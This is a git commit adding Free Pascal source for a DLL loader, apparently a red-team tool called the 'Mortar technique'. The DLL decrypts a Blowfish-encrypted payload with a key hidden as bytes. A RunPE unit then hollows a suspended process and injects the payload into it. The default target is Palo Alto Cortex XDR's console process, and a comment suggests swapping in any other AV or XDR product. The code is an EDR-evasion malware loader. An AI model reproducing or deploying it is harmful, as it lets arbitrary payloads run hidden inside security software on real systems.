5b96ab68cb9a298921c2097ad9fceada24af4212
Lawrence Amer <contact@lawrenceamer.me>
2021-12-13 11:45:14 +0800

    Dll loader
    dll loader to load & execute encrypted binary.

---
+++ DLL/agressor.lpr
@@ -0,0 +1,186 @@
+library agressor;
+
+ {
+ ===========================================
+ MIT License
+
+Copyright (c) 2021 0xsp security research and development
+
+  Title : customized Dll libary for Mortar technique
+  Author : 0xsp.com @zux0x3a
+
+
+  the author of this module is not responsible for any misuse of this code or similair copied code, the source code and compiled binaries
+  are published for the security researching only.
+  the technique has been presented in online conference before the release and well-detailed paper has been posted online to help open-source community to build
+  enhanced security solutions.
+
+ ===============================================================
+
+  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+
+
+
+ }
+
+{$mode objfpc}{$H+}
+
+uses
+  Classes,windows,blowfish,runner,SysUtils,base64,process, strutils;
+
+
+
+function Base64ToStream(const ABase64:string; AOutStream: TMemoryStream; const AStrict: Boolean=false):Boolean;
+var
+  InStream: TStringStream;
+  Decoder: TBase64DecodingStream;
+  temp :string;
+    BA_IN, BA_OUT: array of Byte;
+begin
+  setlength(BA_IN,20);
+
+
+  // adding these as optional in case you wanna do some random nops into the memory
+
+  BA_IN[0]:= $90;
+  BA_IN[1]:= $90;
+  BA_IN[2]:= $90;
+  BA_IN[3]:= $90;
+  BA_IN[4]:= $90;
+  BA_IN[5]:= $90;
+  BA_IN[6]:= $90;
+  BA_IN[7]:= $90;
+  BA_IN[8]:= $90;
+  BA_IN[9]:= $90;
+  BA_IN[10]:= $90;
+  BA_IN[11]:= $90;
+  BA_IN[12]:= $90;
+  BA_IN[13]:= $90;
+  BA_IN[14]:= $90;
+  BA_IN[15]:= $90;
+  BA_IN[16]:= $90;
+  BA_IN[17]:= $90;
+  BA_IN[18]:= $90;
+  BA_IN[19]:= $90;
+
+  Result := False;
+  InStream := TStringStream.Create(ABase64);
+
+  try
+    if AStrict then
+      Decoder := TBase64DecodingStream.Create(InStream, bdmStrict)
+    else
+      Decoder := TBase64DecodingStream.Create(InStream, bdmMIME);
+    try
+      AOutStream.Seek(0,sofrombeginning);
+    //   AoutStream.WriteBuffer(BA_IN,20);
+     //  AoutStream.Position:=0;
+       AOutStream.CopyFrom(decoder,decoder.Size);
+       Result := True;
+    finally
+      Decoder.Free;
+    end;
+  finally
+    InStream.Free;
+  end;
+end;
+
+function bintostr(const bin: array of byte): string;
+const HexSymbols = '0123456789ABCDEF';
+var i: integer;
+begin
+  SetLength(Result, 2*Length(bin));
+  for i :=  0 to Length(bin)-1 do begin
+    Result[1 + 2*i + 0] := HexSymbols[1 + bin[i] shr 4];
+    Result[1 + 2*i + 1] := HexSymbols[1 + bin[i] and $0F];
+  end;
+end;
+
+function blowfish_decryption(input:string):string;
+var
+  de :TBlowFishDeCryptStream;
+  str_strm: TStringStream;
+  key:rawbytestring;
+  AMemStr, AMemStr2: TMemoryStream;
+  AStrStr: TStringStream;
+  processhandle:thandle;
+  BA_IN: array of Byte;
+  outp,url,temp:string;
+
+
+begin
+
+//7a 75 78 69 61 6d 68 65 72 65
+   SetLength(BA_IN, 10);     //string convert into bytes in order avoid storing key as string
+   BA_IN[0]:= $7a;
+   BA_IN[1]:= $75;
+   BA_IN[2]:= $78;
+   BA_IN[3]:= $69;
+   BA_IN[4]:= $61;
+   BA_IN[5]:= $6d;
+   BA_IN[6]:= $68;
+   BA_IN[7]:= $65;
+   BA_IN[8]:= $72;
+   BA_IN[9]:= $65;
+
+
+  url := getcurrentdir+'\bin.enc';   // place the encrypted binary in same folder
+
+  AMemStr := TMemoryStream.Create;
+ AMemStr.LoadFromFile(url);
+  AmemStr.Write(outp[1],length(outp) * sizeof(outp[1]));
+ AMemStr.Position := 0;
+
+  //copy MemoryStream to StringStream
+  AStrStr := TStringStream.Create('');
+  AStrStr.Size := AMemStr.Size;
+  AStrStr.CopyFrom(AMemStr, AMemStr.Size);
+  AStrStr.Position := 0;
+
+   key := TEncoding.UTF8.GetString(BA_IN); // getting string value of array of bytes.
+
+
+  str_strm := TStringStream.Create(AStrStr.DataString);
+  de := TBlowFishDeCryptStream.Create(key,str_strm);
+  AStrStr.Free;
+  SetLength(temp,str_strm.Size);
+  de.Read(temp[1],str_strm.Size);
+  AMemStr2 := TMemoryStream.Create;
+  Base64tostream(temp,Amemstr2,false);
+
+   Fork_x64(input,runner.TByteArray(AMemStr2.memory),processhandle);
+   AMemStr2.Free;
+  Amemstr.Free;
+
+  end;
+
+procedure dec; stdcall;
+
+begin
+
+ // normal mode, cmd process
+blowfish_decryption('c:\windows\system32\cmd.exe');
+
+end;
+
+procedure stealth; stdcall;
+begin
+
+ blowfish_decryption('C:\Program Files\Palo Alto Networks\Traps\CyveraConsole.exe');
+end;
+
+
+exports dec,
+        stealth;
+begin
+ // here replace the path to any XDR solution or AV,below is default path of Cortex
+  blowfish_decryption('C:\Program Files\Palo Alto Networks\Traps\CyveraConsole.exe');
+end.
+
---
+++ Lib/runner.pas
@@ -0,0 +1,241 @@
+
+  {
+ ===========================================
+ MIT License
+
+Copyright (c) 2021 0xsp security research and development
+
+  Unit : RunPE from Memory (Proccess Forking)
+  Author : 0xsp.com @zux0x3a
+
+
+
+  the author of this module is not responsible for any misuse of this code or similair copied code, the source code and compiled binaries
+  are published for the security researching only.
+  the technique has been presented in online conference before the release and well-detailed paper has been posted online to help open-source community to build
+  enhanced security solutions.
+
+ ===============================================================
+
+  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+
+
+
+ }
+unit runner;
+{$mode Delphi}
+
+interface
+
+uses Windows;
+
+type
+  TByteArray = array of Byte;
+
+function VirtualAllocEx(hProcess: THandle; lpAddress: Pointer;
+  dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer;stdcall;external kernel32 name 'VirtualAllocEx';
+
+{$IFDEF win64 }
+function Fork_x64(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;
+{$ENDIF }
+
+
+{$IFDEF win32 }
+function Fork_x86(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;
+{$ENDIF }
+
+function NtUnmapViewOfSection(ProcessHandle: THandle; BaseAddress: Pointer): DWORD; stdcall; external 'ntdll.dll';
+
+implementation
+
+procedure Move(Destination, Source: Pointer; dLength:DWORD);
+begin
+  CopyMemory(Destination, Source, dLength);
+end;
+
+
+{$IFDEF CPU32BITS }
+  function Fork_x86(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;   //works perfect with x64 bit
+ var
+   IDH:        TImageDosHeader;
+   INH:        TImageNtHeaders;
+   ISH:        TImageSectionHeader;
+   PI:         TProcessInformation;
+   SI:         TStartUpInfo;
+   CONT:       TContext;
+   ImageBase:  Pointer;
+   Ret:        DWORD;
+   i:          integer;
+   Addr:       DWORD;
+   dOffset:    DWORD;
+ begin
+   Result := FALSE;
+   try
+     Move(@IDH, @bFile[0], 64); //64
+     if IDH.e_magic = IMAGE_DOS_SIGNATURE then
+     begin
+       Move(@INH, @bFile[IDH._lfanew], 248);     //248
+       if INH.Signature = IMAGE_NT_SIGNATURE then
+       begin
+         FillChar(SI, SizeOf(TStartupInfo),#0);
+         FillChar(PI, SizeOf(TProcessInformation),#0);
+         SI.cb := SizeOf(TStartupInfo);
+         if CreateProcess(nil, PChar(sVictim), nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, SI, PI) then
+         begin
+           CONT.ContextFlags := CONTEXT_FULL;
+           if GetThreadContext(PI.hThread, CONT) then
+           begin
+             ReadProcessMemory(PI.hProcess, Pointer(CONT.Ebx + 100), @Addr, 2, Ret);   // it was 4 changed now to 2  //ESET Exploit will be 100 - 2
+             NtUnmapViewOfSection(PI.hProcess, @Addr);
+             ImageBase := VirtualAllocEx(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE);
+
+             WriteProcessMemory(PI.hProcess, ImageBase, @bFile[0], INH.OptionalHeader.SizeOfHeaders, Ret);
+             dOffset := IDH._lfanew + 248;    //248
+             for i := 0 to INH.FileHeader.NumberOfSections - 1 do
+             begin
+               Move(@ISH, @bFile[dOffset + (i * 40)], 40);     // 40 , 40
+               WriteProcessMemory(PI.hProcess, Pointer(Cardinal(ImageBase) + ISH.VirtualAddress), @bFile[ISH.PointerToRawData], ISH.SizeOfRawData, Ret);
+               VirtualProtectEx(PI.hProcess, Pointer(Cardinal(ImageBase) + ISH.VirtualAddress), ISH.Misc.VirtualSize, PAGE_EXECUTE_READWRITE, @Addr);
+             end;
+              WriteProcessMemory(PI.hProcess, Pointer(CONT.Ebx + 10), @ImageBase, 8, Ret);
+          //   WriteProcessMemory(PI.hProcess, Pointer(CONT.Ebx + 100), @ImageBase, 8, Ret);    //small backdoor less than 76kb will be 8 / 4  or 8 / 8
+             // WriteProcessMemory(PI.hProcess, Pointer(CONT.Ebx + 8), @ImageBase, 8, Ret);  //another one
+             CONT.Eax := Cardinal(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint;
+             SetThreadContext(PI.hThread, CONT);
+             ResumeThread(PI.hThread);
+             Result := TRUE;
+           end;
+         end;
+       end;
+     end;
+   finally // except
+  //   CloseHandle(PI.hProcess);
+     CloseHandle(PI.hThread);
+  threadhandle:=PI.hProcess;
+ end;
+ end;
+
+
+
+{$ELSE }
+
+function Fork_x64(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;   //works perfect with x64 bit
+const
+  cBufferSize = 2048;
+var
+  IDH:        TImageDosHeader;
+  INH:        TImageNtHeaders;
+  ISH:        TImageSectionHeader;
+
+  PI:         TProcessInformation;
+  vSecurityAttributes: TSecurityAttributes;
+  SI:         TStartUpInfo;
+  CONT:       PContext;
+  ImageBase:  pointer;
+ // lpimagebase : Dword64;
+  Ret:        SIZE_T;
+  i:          integer;
+  Addr:       DWORD64;
+  dOffset:    DWORD;
+  rPipe: THandle;
+  wPipe: THandle;
+  vReadBytes: DWord;
+  vBuffer : Pointer;
+begin
+  Result := FALSE;
+
+
+
+  //IDH := @bFile;
+ CopyMemory(@IDH,@bfile[0], 64);
+
+    if IDH.e_magic = IMAGE_DOS_SIGNATURE then
+    begin
+      Move(@INH, @bFile[IDH._lfanew], 264);     //248
+
+      if INH.Signature = IMAGE_NT_SIGNATURE then
+      begin
+        FillChar(SI, SizeOf(TStartupInfo),#0);
+        FillChar(PI, SizeOf(TProcessInformation),#0);
+        SI.cb := SizeOf(TStartupInfo);
+
+
+
+        if CreateProcess(nil, PChar(sVictim), nil, nil, false, CREATE_SUSPENDED, nil, nil, SI, PI) then
+
+        begin
+
+           CONT := PCONTEXT(VirtualAlloc(nil, sizeof(CONT), MEM_COMMIT, PAGE_READWRITE));
+          CONT.ContextFlags := CONTEXT_FULL;
+
+          if GetThreadContext(PI.hThread, CONT^) then
+          begin
+            ReadProcessMemory(PI.hProcess, Pointer(CONT.rdx + $100), @Addr, 2, Ret);
+
+
+          //  NtUnmapViewOfSection(PI.hProcess, @Addr);
+             if Addr = INH.OptionalHeader.ImageBase then
+              begin
+             if NtUnmapViewOfSection(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase)) = 0 then
+             begin
+            ImageBase := VirtualAllocEx(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage,
+             $3000, PAGE_EXECUTE_READWRITE);
+             end
+               else
+              begin
+              ImageBase := VirtualAllocEx(PI.hProcess, nil, INH.OptionalHeader.SizeOfImage, $3000, PAGE_EXECUTE_READWRITE);
+             end;
+            end
+            else
+            begin
+            ImageBase := VirtualAllocEx(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage,
+            $3000, PAGE_EXECUTE_READWRITE);
+
+              end;
+
+            WriteProcessMemory(PI.hProcess, ImageBase, @bFile[0], INH.OptionalHeader.SizeOfHeaders, Ret);
+
+            dOffset := IDH._lfanew + 264;    //248
+            for i := 0 to INH.FileHeader.NumberOfSections - 1 do
+            begin
+              Move(@ISH, @bFile[dOffset + (i * 40)], 40);     // 40 , 40
+              WriteProcessMemory(PI.hProcess, LPVOID(dword64(ImageBase) + ISH.VirtualAddress), @bFile[ISH.PointerToRawData], ISH.SizeOfRawData, Ret);
+              WriteProcessMemory(PI.hProcess, LPVOID(CONT.rdx + $10), @ImageBase, 8, Ret);
+            end;
+
+
+
+
+            CONT.Rcx := Dword64(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint;
+            SetThreadContext(PI.hThread, CONT^);
+            ResumeThread(PI.hThread);
+
+            Result := TRUE;
+
+          end;
+        end;
+      end;
+    end;
+ // finally // except
+ ////   CloseHandle(PI.hProcess);
+ //   CloseHandle(PI.hThread);
+//threadhandle:=PI.hProcess;
+//end;
+//end;
+end;
+{$ENDIF }
+
+
+
+
+
+
+end.
+
